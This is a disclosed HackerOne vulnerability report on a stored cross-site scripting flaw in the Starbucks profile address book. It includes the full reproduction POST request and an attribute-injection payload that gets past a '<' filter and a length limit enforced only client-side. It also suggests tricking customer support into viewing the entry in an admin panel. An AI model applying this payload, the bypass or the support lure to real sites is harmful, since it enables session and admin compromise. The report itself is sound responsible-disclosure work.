# Stored XSS in Adress Book (starbucks.com/account/profile)

## Report Details
- **Report ID**: 186554
- **URL**: https://hackerone.com/reports/186554
- **State**: Closed
- **Severity**: low
- **Submitted**: 2016-11-29T20:26:01.316Z
- **Disclosed**: 2017-05-31T20:05:38.316Z

## Reporter
- **Username**: myst404
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: starbucks

## Vulnerability Information
Hello,

I just found a stored XSS in the "Adress book menu" of a user's profile : https://www.starbucks.com/account/profile

# Description :

XSS is happening due to the lack of filtering on the **Address.FirstName** parameter when you POST a new address on the URL : https://www.starbucks.com/account/profile/AddressSave :

{F138388}
{F138390}

Here are the POST Parameters to reproduce the issue:

{F138394}

```
Address.AddressName=bbbbb%22%3E&Address.FirstName=z%22 onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">&Address.LastName=bbbbb%22%3E&Address.Country=US&Address.AddressLine1=bbbbb%22%3E&Address.AddressLine2=aaaa%22%3E&Address.City=aaaa%22%3E&Address.CountrySubdivision=AK&Address.PostalCode=75000&Address.PhoneNumber=9901231093&Address.PhoneExtension=&Address.AddressType=Registration&Address.AddressId=32ecef14-f8af-4b5e-adad-d8d2adc8ddad&Address.VerificationStatus=Override&IsAddress=true&__RequestVerificationToken=MDSbXzmn-5j18ck06PpT7Og05zgwOzgq8FMwiqTXIeUfcfRS-keyp9i_x0VbBaIfvUo7EhzYGMvvzPUc0WG5QqlG_YathJ80lgs-p3PCoyNfdvo_E-XY6JfoC9R4tPir0
```

It was quite tricky to leveraged.
Indeed :
- It looks like no parameter from this request is filtered. However, except **Address.FirstName**, they are printed are inside an HTML tag and you prevented the opening of a new tag by blocking anything with "<." (where the point can be anything of course)
- The maximum length of each field (15 characters) is only checked client-side, though short XSS exists
- That is why my final payload is :

**z" onmouseover="alert('Hackerone')" style="position:fixed;left:0;top:0;width:9999px;height:9999px;">**

Here is the email of my account if you can check by yourself: *██████*

# Risks
I assume that you perfectly know the risks of an XSS. 
This one presents a high/critical risk as my addresses can, I think, be seen in the admin panel. I just have to contact the Customer Support for them to look at my account and trigger the XSS.


#Remediation
I also assume that you know how to correct XSS properly as it looks like it is well done elsewhere on the website.


Best regards,

## Attachments
- Capture_d_e_cran_2016-11-29_a__21.04.18.png
- Capture_d_e_cran_2016-11-29_a__21.11.11.png
- Capture_d_e_cran_2016-11-29_a__21.14.26.png
